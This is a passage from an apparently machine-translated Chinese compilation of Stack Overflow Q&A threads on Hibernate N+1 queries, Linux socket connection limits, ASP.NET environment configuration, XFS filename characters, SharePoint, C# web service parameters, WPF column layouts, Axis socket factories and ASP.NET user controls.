[Django书](http://www.djangobook.com/en/1.0/)（特别是附录[B](http://www.djangobook.com/en/1.0/appendixB/)）似乎建议您覆盖模型类`delete`上的方法`User`并让它触发额外的删除。

# java - Hibernate 可以在性能敏感的应用程序中使用吗？

> ID：651664
> 
> 赞同：21
> 
> 时间：2009-03-16T18:44:49.993
> 
> 标签：java, performance, hibernate, jpa, jakarta-ee

我在检索与其他对象有很多关系的多个对象实例时看到了性能问题。我在 MySQL 中使用 Spring 和 Hibernate 的 JPA 实现。问题是在执行 JPA 查询时，Hibernate 不会自动连接到其他表。这会产生 n*r + 1 个 SQL 查询，其中 n 是要检索的对象数，而 r 是关系数。

例如，一个人住在一个​​地址，有很多爱好，并且去过很多国家：

```
@Entity
public class Person {
    @Id public Integer personId;    
    public String name;    
    @ManyToOne public Address address;    
    @ManyToMany public Set<Hobby> hobbies;    
    @ManyToMany public Set<Country> countriesVisited;
} 
```

当我执行 JPA 查询以获取所有名为 Bob 的人员时，数据库中有 100 个 Bob：

```
SELECT p FROM Person p WHERE p.name='Bob' 
```

Hibernate 将其转换为 301 SQL 查询：

```
SELECT ... FROM Person WHERE name='Bob'
SELECT ... FROM Address WHERE personId=1
SELECT ... FROM Address WHERE personId=2
...
SELECT ... FROM Hobby WHERE personId=1
SELECT ... FROM Hobby WHERE personId=2
...
SELECT ... FROM Country WHERE personId=1
SELECT ... FROM Country WHERE personId=2
... 
```

根据 Hibernate FAQ（[这里](http://www.hibernate.org/118.html#A23)和[这里](http://www.hibernate.org/117.html#A30)），解决方案是在查询中指定 LEFT JOIN 或[LEFT OUTER JOIN（用于多对多）](http://www.hibernate.org/117.html#A12)。所以现在我的查询看起来像：

```
SELECT p, a, h, c FROM Person p
LEFT JOIN p.address a LEFT OUTER JOIN p.hobbies h LEFT OUTER JOIN p.countriesVisited c
WHERE p.name = 'Bob' 
```

这可行，但如果有多个 LEFT OUTER JOIN 则似乎存在错误，在这种情况下，Hibernate 会错误地查找不存在的列：

```
could not read column value from result set: personId69_2_; Column 'personId69_2_' not found. 
```

该错误行为似乎可以通过[Hibernate Core 错误 HHH-3636](http://opensource.atlassian.com/projects/hibernate/browse/HHH-3636)解决。不幸的是，该修复不是任何已发布的 Hibernate JAR 的一部分。我已经针对快照构建运行了我的应用程序，但错误行为仍然存在。我还使用存储库中的最新代码构建了自己的 Hibernate Core JAR，并且错误行为仍然存在。所以也许 HHH-3636 没有解决这个问题。

这种 Hibernate 性能限制非常令人沮丧。如果我查询 1000 个对象，则会对数据库进行 1000*r + 1 个 SQL 查询。在我的例子中，我有 8 个关系，所以我得到了 8001 个 SQL 查询，这导致了糟糕的性能。对此的官方 Hibernate 解决方案是左连接所有关系。但是由于错误行为，这对于不止一个多对多关系是不可能的。因此，由于多对多关系，我坚持使用左连接进行多对一关系和 n*r+1 查询。我计划将 LEFT OUTER JOIN 问题作为 Hibernate 错误提交，但与此同时，我的客户需要一个性能合理的应用程序。我目前使用批量提取（BatchSize）的组合，ehcache 和自定义内存缓存，但性能仍然很差（它将检索 5000 个对象的时间从 30 秒提高到 8 秒）。底线是太多的 SQL 查询正在访问数据库。

那么，我的问题是，是否可以在表之间有多个关系的性能敏感应用程序中使用 Hibernate？我很想听听 Hibernate 如何成功地使用地址性能。我应该手写 SQL（这在某种程度上违背了使用 Hibernate 的目的）吗？我应该对我的数据库模式进行反规范化以减少连接表的数量吗？如果我需要快速查询性能，我不应该使用 Hibernate 吗？有什么更快的吗？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2009-03-16T20:13:57.720

如果您阅读了链接到的全部常见问题解答，请参阅我对您[其他问题的回答：](https://stackoverflow.com/questions/467282/jpa-hibernate-maximum-number-of-joins)

> 遵循最佳实践指南！确保 all 和 mappings 在 Hibernate2 中指定lazy="true"（这是 Hibernate3 中的新默认值）。使用 HQL LEFT JOIN FETCH 指定需要在初始 SQL SELECT 中检索的关联。
> 
> 避免 n+1 选择问题的第二种方法是在 Hibernate3中使用***fetch="subselect" 。***
> 
> 如果您仍然不确定，请参阅 Hibernate 文档和 Hibernate in Action。

请参阅有关[提高性能](http://www.hibernate.org/hib_docs/v3/reference/en-US/html/performance.html)的提示。如果你对连接不小心，你最终会遇到[笛卡尔积](http://en.wikipedia.org/wiki/Cartesian_product)问题。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2009-03-16T22:21:53.310

除了“获取”策略之外，您还可以尝试在休眠属性中设置批量获取大小，因此它不会一个一个地运行连接查询，而是分批运行。

在您的 appContext.xml 中：

```
<bean id="sessionFactory" class="org.springframework.orm.hibernate3.LocalSessionFactoryBean">
    ...    
    <property name="hibernateProperties">
        <props>        
            ...
            <prop key="hibernate.default_batch_fetch_size">32</prop>
        </props>
    </property>
</bean> 
```

所以而不是：

```
SELECT ... FROM Hobby WHERE personId=1
SELECT ... FROM Hobby WHERE personId=2 
```

你会得到：

```
SELECT ... FROM Hobby WHERE personId in (1,2,...,32);
SELECT ... FROM Hobby WHERE personId in (33,34,...,64); 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2009-03-16T19:16:28.187

您是否尝试过集合的“加入”[获取策略？](http://www.hibernate.org/315.html)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-03-16T19:26:05.230

如果您需要 Hibernate 的某个功能并且此功能有问题，您有两个选择：a) 提交错误请求并使用解决方法（性能缓慢或手写 sql），直到修复错误，这需要一段时间 b) 提交错误请求以及错误修复和测试。（当然，您可以只使用错误修复并跳过错误请求和测试部分）。

# linux - 可能有多少个套接字连接？

> ID：651665
> 
> 赞同：85
> 
> 时间：2009-03-16T18:44:51.710
> 
> 标签：linux, sockets, tcp, max, server-hardware

有谁知道现代标准 Linux 服务器上可能有多少个 tcp-socket 连接？

（通常每个连接上的流量较少，但所有连接都必须一直处于运行状态。）

* * *

## 回答 #1

> 赞同：89
> 
> 时间：2012-03-13T00:45:32.160

我在 Linux 桌面（16G RAM，I7 2600 CPU）上实现了 1600k 并发空闲套接字连接，同时实现了 57k req/s。它是用 C 语言编写的带有 epoll 的单线程 http 服务器。源代码在[github 上](https://github.com/shenfeng/dictionary)，这里有一个[博客](https://web.archive.org/web/20150315003632/http://shenfeng.me/how-far-epoll-can-push-concurrent-socket-connection.html)。

编辑：

我在同一台计算机上使用 JAVA/Clojure 进行了 600k 并发 HTTP 连接（客户端和服务器）。详细信息[帖子](http://shenfeng.me/600k-concurrent-connection-http-kit.html)，HN 讨论： http://news.ycombinator.com/item?id= [5127251](http://news.ycombinator.com/item?id=5127251)

连接的成本（使用 epoll）：

*   应用程序每个连接需要一些 RAM
*   TCP 缓冲区 2 * 4k ~ 10k，或更多
*   epoll 需要一些内存来存储文件描述符，来自 epoll(7)

> 每个注册的文件描述符在 32 位内核上大约需要 90 个字节，在 64 位内核上大约需要 160 个字节。

* * *

## 回答 #2

> 赞同：24
> 
> 时间：2009-03-16T19:04:59.947

这不仅取决于所讨论的操作系统，还取决于配置，可能是实时配置。

对于 Linux：

```
cat /proc/sys/fs/file-max 
```

将显示当前允许同时打开的最大文件描述符总数。查看[http://www.cs.uwaterloo.ca/~brecht/servers/openfiles.html](http://www.cs.uwaterloo.ca/~brecht/servers/openfiles.html)

* * *

## 回答 #3

> 赞同：9
> 
> 时间：2009-05-30T15:49:52.017

10,000？70,000？这就是全部 ：）

FreeBSD 可能是您想要的服务器，这里有一篇关于调整它以处理 100,000 个连接的[小博客文章](http://rerepi.wordpress.com/2008/04/19/tuning-freebsd-sysoev-rit/)，它有一些有趣的功能，例如零拷贝套接字，以及作为完成端口机制的 kqueue。

上个世纪的[Solaris 可以处理 100,000 个连接！](http://lkml.indiana.edu/hypermail/linux/kernel/9909.3/0553.html)他们说linux会更好

我遇到的最好的描述是这个关于编写可扩展网络服务器的演示文稿/论文。他不怕这样说:)

> 软件也是如此：应用层的白痴迫使操作系统层进行了巨大的创新。由于 Lotus Notes 保持每个客户端打开一个 TCP 连接，IBM 为 Linux 的“一个进程，100.000 个打开的连接”案例做出了重大优化
> 
> O(1) 调度程序最初是为了在一些不相关的 Java 基准测试中取得好成绩而创建的。最重要的是，这种膨胀对我们所有人都有好处。

* * *

## 回答 #4

> 赞同：9
> 
> 时间：2017-04-09T11:03:11.650

在 /proc 文件系统中可以配置打开套接字的数量限制

```
cat /proc/sys/fs/file-max 
```

操作系统中由整数限制定义的*传入*连接的最大值。

Linux 本身允许**数十亿**个打开的套接字。

要使用套接字，您需要一个应用程序监听，例如一个 Web 服务器，并且每个套接字将使用一定数量的 RAM。

RAM 和 CPU 将引入真正的限制。（现代 2017 年，想想数百万而不是数十亿）

100万是可能的，不容易。预计将使用 X GB 的 RAM 来管理 100 万个套接字。

*传出*TCP 连接受每个 IP 约 65000 个端口号的限制。您可以拥有多个 IP 地址，但不能拥有无限的 IP 地址。这是 TCP 而非 Linux 中的限制。

* * *

## 回答 #5

> 赞同：5
> 
> 时间：2009-03-17T18:09:10.790

在 Linux 上，您应该考虑使用 epoll 进行异步 I/O。可能还值得微调套接字缓冲区，以免每个连接浪费太多内核空间。

我猜你应该能够在一台合理的机器上达到 10 万个连接。

* * *

## 回答 #6

> 赞同：3
> 
> 时间：2011-11-27T14:52:34.007

取决于应用程序。如果每个客户端只有几个包，那么 100K 对于 linux 来说非常容易。我团队的一位工程师多年前做过一个测试，结果显示：当连接建立后没有来自客户端的包时，linux epoll 可以在 cpu 使用率低于 50% 的情况下观察 400k fd 的可读性。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2009-03-16T22:15:42.810

哪个操作系统？

对于 Windows 机器，如果您正在编写一个可扩展的服务器，因此使用 I/O 完成端口和异步 I/O，那么主要限制是您用于每个活动连接的非分页池的数量. 这直接转化为基于您的机器已安装的内存量的限制（非分页池是基于安装的总内存的有限、固定大小的量）。

对于没有看到太多流量的连接，您可以通过发布不使用非分页池且不影响锁定页面限制的“零字节读取”来减少它们的效率（另一个可能会阻止您的潜在有限资源）有很多套接字连接打开）。

除此之外，你还需要进行分析，但我已经设法在一个适度指定的（760MB 内存）服务器上获得了超过 70,000 个并发连接；有关更多详细信息，请参见此处 [http://www.lenholgate.com/blog/2005/11/windows-tcpip-server-performance.html](http://www.lenholgate.com/blog/2005/11/windows-tcpip-server-performance.html)。

显然，如果您使用的是效率较低的架构，例如“每个连接的线程”或“选择”，那么您应该期望获得不那么令人印象深刻的数字；但是，恕我直言，没有理由为 Windows 套接字服务器选择这样的架构。

**编辑：**见这里[http://blogs.technet.com/markrussinovich/archive/2009/03/26/3211216.aspx](http://blogs.technet.com/markrussinovich/archive/2009/03/26/3211216.aspx)；在 Vista 和 Server 2008 中计算非分页池数量的方式发生了变化，现在可用的数量更多。

* * *

## 回答 #8

> 赞同：-12
> 
> 时间：2009-03-16T19:43:19.900

实际上，对于一个应用程序，单台机器上超过 4000-5000 个打开的套接字变得不切实际。仅仅检查所有套接字上的活动并对其进行管理就开始成为一个性能问题——尤其是在实时环境中。

# asp.net - 如何确保我们将生产发布到产品服务器并测试到测试服务器

> ID：651668
> 
> 赞同：0
> 
> 时间：2009-03-16T18:46:54.887
> 
> 标签：asp.net, web-config, publishing

我的 Web.Config 文件中有一个条目，指示我所在的连接字符串和垃圾环境：

```
<add key="AppEnv" value ="2" /> <!--(0 = Dev, 1 = test, 2 = prod)--> 
```

我正在寻找一种在发布时提醒开发人员的方法，以确保他们已检查此键/值，以便他们不会将“测试”发布到“产品”服务器，反之亦然。

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-05-21T04:51:34.757

我已经提出了我自己的（可能是非常规的）解决方案来解决这个问题。我们为许多不同的客户开发了许多不同的 Web 项目，并且由于我们在多个 web.config 文件中遇到的所有问题，或者在发布前需要进行编辑，因此将它们全部迁移到这种方法。

基本上，我们让我们的应用程序根据传入的 URL 告诉我们它在哪个环境下运行。我们在第一个请求时对其进行初始化，并将其存储在应用程序生命周期的内存中。通过这种方式，我们可以将每个环境特定的配置值存储在同一个配置文件中，并使用 Development、Staging、Production 等来限定它们。任何在环境之间没有差异的设置都不需要限定。

首先是一个示例 web.config：

```
<appSettings>
    <add key="DevelopmentHost" value="dev.trackmyhours.com" />
    <add key="StagingHost" value="staging.trackmyhours.com" />
    <add key="ProductionHost" value="www.trackmyhours.com" />
  </appSettings>

  <connectionStrings>
    <clear />
    <add name="DevelopmentConnectionString" connectionString="your dev conn string" providerName="System.Data.SqlClient" />
    <add name="StagingConnectionString" connectionString="your staging conn string (mine is typically same as staging)" providerName="System.Data.SqlClient" />
    <add name="ProductionConnectionString" connectionString="your production conn string" providerName="System.Data.SqlClient" />
  </connectionStrings> 
```

接下来我们有一个“App”类，它使我们能够访问我们的“Site”类，但是您可以按照您认为合适的方式构建您的类。

```
Public Class App

    Private Shared _Site As New Site
    Public Shared ReadOnly Property Site() As Site
        Get
            Return _Site
        End Get
    End Property

End Class 
```

* * *

```
Imports System.Configuration
Imports System.Web

Public Class Site

    Public Enum EnvironmentType
        Development
        Staging
        Production
    End Enum

    Friend Sub New()

        If HttpContext.Current IsNot Nothing Then

            Dim URL = HttpContext.Current.Request.Url.DnsSafeHost

            Select Case URL
                Case ConfigurationManager.AppSettings("DevelopmentHost"), "localhost"
                    _Environment = EnvironmentType.Development
                Case ConfigurationManager.AppSettings("StagingHost")
                    _Environment = EnvironmentType.Staging
                Case ConfigurationManager.AppSettings("ProductionHost")
                    _Environment = EnvironmentType.Production
            End Select

        Else
            'probably getting called from a winforms/console app, or unit tests
            _Environment = EnvironmentType.Staging

        End If

        _ConnectionString = ConfigurationManager.ConnectionStrings(_Environment.ToString & "ConnectionString").ConnectionString

    End Sub

    Private _Environment As EnvironmentType
    Public Property Environment() As EnvironmentType
        Get
            Return _Environment
        End Get
        Set(ByVal value As EnvironmentType)
            _Environment = value

            _ConnectionString = ConfigurationManager.ConnectionStrings(_Environment.ToString & "ConnectionString").ConnectionString

        End Set
    End Property

    Private _ConnectionString As String
    Public ReadOnly Property ConnectionString() As String
        Get
            Return _ConnectionString
        End Get
    End Property

End Class 
```

我们将类放入 Biz Object 类库中。我们刚刚决定不必确定每个请求的环境，因为它在应用程序的生命周期内确实无法更改。此外，这允许我们在库中的代码或后面的代码中从 ANYWHERE 引用 App.Site.Environment。如果您需要在代码中添加一些条件逻辑，这也很有帮助——比如在开发/暂存中运行时不向真实的人发送电子邮件。

最后一件事 - 对于我们的 Linq2SQL 或 EF Data/ObjectContexts，我们不会将连接字符串存储在文件中，而是重载构造函数，以便我们可以提供正确的环境连接字符串，如下所示：

```
Partial Class SampleDataContext
    Sub New()
        MyBase.New(App.Site.ConnectionString)
    End Sub
End Class 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-03-16T18:54:02.640

这是一个解决方案：将该文件存储为“ `Web.Config.in`”在源代码管理下。

在每台服务器（开发、测试、登台、生产）上，复制`Web.Config.in`到`Web.Config`并仔细编辑该`AppEnv`值。

在从一个环境到下一个环境的每次后续推送中，排除`Web.Config`文件。也就是说，不要覆盖该特定文件。例如，编写运行`rsync --exclude WebConfig`的部署脚本。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-03-16T18:58:31.177

如果网站未处于生产模式，我在页面顶部以粗体红色字母显示该站点处于何种模式。

我还有一个诊断页面，其中列出了正在运行的服务器以及它连接到的数据库。

您还可以在每个数据库中放置一个查找表，以确保您连接了正确的标志。（在测试数据库中将其标记为 1 并检查 Application_Start 值是否匹配）

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-03-16T19:49:48.200

每当有一个过程总是需要不止一个步骤时，我知道我至少有一半的时间会搞砸它。出于这个原因，我喜欢 MSBuild。

MSBuild 的盒子中有很多有用的任务，例如[AspNetCompiler 任务](http://msdn.microsoft.com/en-us/library/ms164291.aspx#)，它似乎是一步编译/发布操作。

还有几个项目为各种目的聚合了大量“自定义”MSBuild 任务。[MSBuild 社区任务项目](http://msbuildtasks.tigris.org/)有一个 XmlMassUpdate 任务，可用于对 xml 格式的文件进行多项更改。换句话说，非常适合更新 web.config 文件。

[我在这里](http://blogs.microsoft.co.il/blogs/dorony/archive/2008/01/18/easy-configuration-deployment-with-msbuild-and-the-xmlmassupdate-task.aspx)找到了一个将 XmlMassUpdate 任务与 Web 部署项目结合使用的示例。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-03-17T06:27:35.360

一个不断出现的永恒问题！我猜几乎任何认真的 ASP.NET 开发人员都曾在某些方面对此表示反对。

对于 ASP.NET 4.0，有一些帮助 - 改进的 Web 部署选项将提供一个称为“web.config 转换”的功能。

查看有关该主题的[第 9 频道视频](http://channel9.msdn.com/shows/10-4/10-4-Episode-10-Making-Web-Deployment-Easier/)- 尚未找到任何体面的书面参考资料...

马克

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-03-17T12:42:47.767

我将任何在测试和生产中不同的密钥放入一个全新的 .config 文件中。我将测试设置放在测试上，将生产设置放在生产上，并且从不将此文件从测试复制到生产。然后，在您的常规 web.config 中，您可以像这样指定这个新的 .config 文件：

```
<appSettings file="ExternalWeb.config>
    .... common keys go here
</appSettings> 
```

在测试服务器上，“external.config”将包含特定于该服务器的值，在生产中，它将具有 prod 值。这允许您在两台服务器之间复制整个 web.config，而无需手动更改文件。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2009-05-09T08:19:14.330

我认为在 web.config 中存储连接字符串是不好的做法，而是在我的网站之外的一个常见的已知位置创建一个单独的配置文件，例如

C:\xxxx\config.xml

然后我将所有与机器相关的设置存储在那里。因此，在我的实时服务器上，我有我的实时设置，在测试数据库的测试服务器连接字符串和我的开发机器上，我有我的本地设置。然后，这些设置也可以在该服务器上的所有网站和 .net 应用程序中继续使用。数据库更改时只有一个地方需要更新。

完美的！

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2009-05-29T00:30:44.577

将您的 Web.Config 设置为“只读”，因此在发布到这些服务器时不会被覆盖。

权衡是您必须手动维护每台服务器上的 web.config，并且您的发布将声称失败，因为它无法覆盖远程服务器上的 web.config；但恕我直言，这比每次上传时都修改配置更可取

# filesystems - XFS 文件系统中的所有非法字符是什么？

> ID：651677
> 
> 赞同：1
> 
> 时间：2009-03-16T18:49:03.370
> 
> 标签：filesystems, illegal-characters

有人可以提供（或指向我的列表）XFS 文件系统中的所有非法字符吗？我正在编写一个需要清理文件名的应用程序。

编辑：

好的，所以 POSIX 文件系统应该允许除 NUL 字符、正斜杠和 '.' 之外的所有字符。和 '..' 文件名被保留。所有其他例外都是应用程序级别的。谢谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-03-16T19:20:28.690

POSIX 文件系统（包括 XFS）允许文件名中的每个字符，但 NUL (0x00) 和正斜杠 (/; 0x2f) 除外。

*   NUL 标记 C 字符串的结尾；所以在文件名中是不允许的。
*   / 是目录分隔符，所以不允许。
*   `.`以点 ( ; 0x2e)开头的文件名被视为隐藏文件。这是用户空间，而不是内核或文件系统约定。
*   您可能要遵循一些约定——例如，UTF-8 文件名——在这种情况下，还有很多很多的限制，包括使用哪种规范化形式。

现在，您可能也想禁止其他事情；处理各种奇怪字符的文件名并不好玩。我强烈建议使用白名单方法。

此外，在处理文件名时，请注意`..`每个目录中的条目。您不想遍历它并允许任意路径。

来源：[Single Unix Spec v. 3, §3.169](http://www.opengroup.org/onlinepubs/000095399/basedefs/xbd_chap03.html#tag_03_169)，“组成名称的字符可以从所有字符值的集合中选择，不包括斜杠字符和空字节。”

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-03-16T19:10:48.247

根据[Wikipedia](http://en.wikipedia.org/wiki/XFS)，除 NUL 之外的任何字符在 XFS 文件系统文件名中都是合法的。当然，POSIX 通常不允许`'/'`在文件名中使用正斜杠。除此之外，任何东西都应该是好的，包括国际字符。

# sharepoint - 如何在创建 SharePoint 列表时触发代码？

> ID：651681
> 
> 赞同：4
> 
> 时间：2009-03-16T18:49:58.407
> 
> 标签：sharepoint

我知道列表中添加的项目等的事件接收器。但是，我还没有找到在创建列表时触发代码的方法。

我要做的是在创建列表时（由用户通过 UI）将工作流与列表相关联。

有人有什么想法吗？

谢谢。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2009-03-16T20:42:08.323

您可以选择几条路线...

您可以在定义了工作流关联的地方编写自己的列表定义 - 这样，根据您的列表定义创建的所有列表都将默认包含您的工作流。

或者...根据您的工作流程...编写一个 EventReceiver 附加到您希望将工作流程附加到的所有类型的列表（可以很容易地实现一个功能）并让您的事件接收器在第一个项目时关联工作流程被添加。

或者您可以将工作流与列表中使用的内容类型相关联（您自己的内容类型附加到您自己的列表定义或默认的 SharePoint 内容类型）

我不知道您的其他解决方案，因此我很难为您建议最佳解决方案。

我（几乎）总是做的是编写我自己的列表定义——这样我就可以避免现在或将来出现这样的问题。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2010-12-09T08:24:15.500

使用 SharePoint 2010，现在可以通过覆盖[SPListEventReceiver](http://msdn.microsoft.com/en-us/library/microsoft.sharepoint.splisteventreceiver_members%28v=office.14%29.aspx)类中的 ListAdded 事件来挂钩列表创建事件。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-03-16T19:19:38.990

我通常会部署一个额外的视图页面，该页面设置为默认视图。当用户创建列表时，他将被发送到包含代码设置的视图页面。视图页面然后调用我创建的方法，该方法更改默认视图，删除设置视图并更改指向设置视图的任何导航节点。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-03-17T02:36:00.953

这个问题可能没有完美的答案，因为没有列表添加事件接收器（如果我没记错的话）。

我不知道是否是这种情况，但如果您真的只需要在任何新列表中注册添加（或更新、删除等）事件，我相信您可以在网站 (SPWeb) 上注册这些事件级别，它们将在创建的任何新列表上触发。

# c# - 无法识别作为输出参数的字节数组

> ID：651682
> 
> 赞同：0
> 
> 时间：2009-03-16T18:50:23.523
> 
> 标签：c#, parameters, arguments, return-value

我有一个 webmethod 工作，它返回一个字节数组给调用者：

```
public byte[] DownloadPDF(string URI) 
```

我不得不改变它以返回另一个输出（一个字符串）。所以，我决定完全改变方法，现在返回 void 并有 3 个参数，如下所示：

```
public void DownloadFile(string URI, out byte[] docContents, out string returnFiletype) 
```

我的 Web 服务编译正确，但我怀疑第二个参数（即字节数组）有问题，因为当我“添加 Web 引用”并构建代理类时，该方法只有 2 个参数，而不是 3 个）：

```
[System.Web.Services.Protocols.SoapDocumentMethodAttribute("http://tempuri.org/DownloadFile", RequestNamespace="http://tempuri.org/", ResponseNamespace="http://tempuri.org/", Use=System.Web.Services.Description.SoapBindingUse.Literal, ParameterStyle=System.Web.Services.Protocols.SoapParameterStyle.Wrapped)]
    [return: System.Xml.Serialization.XmlElementAttribute("docContents", DataType="base64Binary")]
    public byte[] DownloadFile(string URI, out string returnFiletype) {
        object[] results = this.Invoke("DownloadFile", new object[] {
                    URI});
        returnFiletype = ((string)(results[1]));
        return ((byte[])(results[0]));
    } 
```

我不明白为什么我的第二个参数字节数组被忽略了，但它似乎是问题的根源。

这当然让我在 Web 客户端应用程序中搞砸了，我在编译时收到一条错误消息：

```
No overload for method 'DownloadFile' takes '3' arguments 
```

这是我需要传递 3 个参数的 Web 客户端中的代码：

```
myBrokerASMXProxy.ASMXProxy.FileService client = new myASMXProxy.ASMXProxy.FileService();

        byte[] fileDataBytes;
        string fileType;
        client.DownloadFile(URI, fileDataBytes, fileType); 
```

我正在考虑将其改回以返回一个字节数组并仅添加一个“out”参数，但我认为我应该就此向专家询问，一般来说，处理多个输出要求的最佳实践是什么。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-03-16T18:56:25.737

字节数组没有被忽略——而是被作为返回类型。我不知道它为什么这样做，但在我看来它更有意义。我不会在 void 方法中使用 out 参数。我怀疑代理生成器只是采用任何没有参数的方法并将第一个方法转换为返回类型。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-03-16T18:59:39.367

你为什么不尝试把这个签名：

```
public bool DownloadFile(string URI, out byte[] docContents, out string returnFiletype) 
```

看看会发生什么？我同意 Jon Skeet 的观点，但您仍然可以返回一个带有操作结果的 bool

# wpf - 在 WPF 中持久化 ListView 列布局的最佳实践

> ID：651683
> 
> 赞同：3
> 
> 时间：2009-03-16T18:50:29.293
> 
> 标签：wpf, listview, layout

目标是让用户隐藏/显示/移动/调整列大小，保存此布局，并能够在应用程序重新启动时恢复它。我先告诉你我是怎么做的。在 GridView.Columns 上，我附加到 CollectionChanged 以及每个 Column.With 依赖属性。当任何事件被触发时，我将列的顺序、可见性和宽度保存到一个专有字符串中，然后将其保存到一个 XML 设置文件中。但在我看来，这是一项相当多的手工工作 - 是否有流行的现有组件或实践来保存 Columns 布局？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-03-16T19:05:03.487

您可以将列保存在 XAML 中吗？经过快速测试，它似乎保存了相关信息。我从这个开始：

```
<GridView>
    <GridView.Columns>
        <GridViewColumn Header="First Name" DisplayMemberBinding="{Binding FirstName}"/>
        <GridViewColumn Header="Last Name" DisplayMemberBinding="{Binding LastName}"/>
        <GridViewColumn Header="Age" DisplayMemberBinding="{Binding Age}"/>
    </GridView.Columns>
</GridView> 
```

在调整大小和移动一些之后，我打电话[`XamlWriter.Save`](http://msdn.microsoft.com/en-us/library/system.windows.markup.xamlwriter.save.aspx)得到`GridView.Columns`了这个：

```
<GridViewColumnCollection xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation">
    <GridViewColumn Width="108.51" DisplayMemberBinding="{Binding Path=FirstName}">First Name</GridViewColumn>
    <GridViewColumn DisplayMemberBinding="{Binding Path=Age}">Age</GridViewColumn>
    <GridViewColumn Width="83.8533333333333" DisplayMemberBinding="{Binding Path=LastName}">Last Name</GridViewColumn>
</GridViewColumnCollection> 
```

# attributes - Axis SecureSocketFactory - 设置构造函数属性

> ID：651684
> 
> 赞同：3
> 
> 时间：2009-03-16T18:51:09.980
> 
> 标签：attributes, https, axis, factory

在使用以下属性进行 https 连接时，我有一个客户 SecureSocketFactory 设置供 Axis 使用：

```
AxisProperties.setProperty("axis.socketSecureFactory",
    "com.metavante.csp.model.manager.mobilepayments.MonitiseSSLSocketFactory"); 
```

当 Axis 实例化此类时，会调用带有 Hashtable（属性）的构造函数。我看到这个表中设置了超时属性。无论如何要在其中设置更多值吗？我希望能够通过使用静态或系统属性在每个实例场景而不是全局配置套接字工厂。

**编辑**：我发现这些属性实际上是 HttpSender (BasicHandler) 选项。我仍然无法动态设置这些。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-03-16T21:41:32.767

我想出了解决问题的方法。在我想设置我使用的属性的代码中： `serviceLocator.getEngine().setOption(USE_CERT_PROPERTY, new Boolean(true));`

其中 getEngine 返回正在使用的 AxisEngine。然后在套接字工厂我可以：

```
Boolean useSMS = (Boolean) MessageContext.getCurrentContext().getProperty(OtherClass.USE_CERT_PROPERTY); 
```

我可以将对象设置为任何值，也许我会使用我需要的证书名称。希望这可以帮助某人。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-12-04T13:07:09.123

如果您对修改 SocketFactory 行为感兴趣，可以检索 SocketFactory 实例，然后更改或添加属性。但是如果你这样做，你还应该注入 HashTable 属性（带有超时）。我认为没有一个最终的和漂亮的解决方案。

```
AxisProperties.setProperty("org.apache.axis.components.net.SecureSocketFactory", MyAxisSocketFactory.class.getName());
MyAxisSocketFactory factory = (MyAxisSocketFactory) SocketFactoryFactory.getFactory("https", myHashTableParams);
factory.setMyStuff(); 
```

在这段代码之后，将创建和配置 SocketFactory 的实例，并准备好在 Web 服务中使用，或者任何 ^_^

# asp.net - ASP.NET：页面上的所有内容，还是分成控件？

> ID：651696
> 
> 赞同：3
> 
> 时间：2009-03-16T18:55:15.960
> 
> 标签：asp.net, architecture, controls

当您制作一个在视觉上分解为特定区域的页面时，您是将这些区域分解为控件，还是将所有内容放在页面上并在一个代码隐藏中？

如果将区域划分为控件，您如何促进控件之间的通信？通过通信，我的意思是简单地在服务器端交换数据。

想想一个在相当复杂的 GridView 上方有几个框的页面。一个框指示 GridView 显示的内容，另一个框允许您使用 GridView 执行各种操作。两个盒子都需要与网格通信，但彼此不需要。

为此的代码隐藏至少有几千行。

任何有关做出此类设计决策的资源都会有所帮助。

谢谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-03-16T19:02:36.923

对于我的第一个 asp.net 应用程序，我使用了分离到控件的方法。但是，我不再这样做了，我现在采取的方法是将所有内容都放在一页中。如果您需要跨多个页面重复页面的相同部分和功能，我只会使用控件。重用确实是控件的目的。

如果您打算采用多控件方法，您可以在控件上使用属性、方法和/或事件，以允许它们相互通信或与页面上的控件通信。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-03-16T19:03:01.027

用户控件促进了可重用性，并且它们偶然地将功能分解为更小的部分，这可以使代码库更易于管理。您也可以通过使用区域和其他组织技术在一个单一页面上仔细规划您的代码来做到这一点。

过去我都做过，两者都可以工作。我发现进行控件到页面通信的最佳方法是使用事件——即给定一个带有 BoxA（网格显示）和 BoxB（网格选项）和 Grid（其中包含 gridview 的用户控件）的页面，BoxA 可以定义一个事件“DisplaySettingsChanged”，只要其设置发生更改，它就会在回发期间抛出。托管页面将在不同组件之间创建事件订阅，例如捕获 DisplaySettingsChanged 并调用 Grid.Refresh 或其他。

For all the extra infrastructure, if you're sure you don't want to re-use any of these components anywhere, I would probably put it in one monolithic page with extra care taken to keep everything organized and readable.

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-03-16T19:14:18.707

There are a few reasons you may use user controls, for example:

*   **Modular code**: instead of one bloated page class, you can partition the code into several user controls, each with less code. Thus, if your page has too much code to manage, splitting it up into user controls could reduce the size of each class.
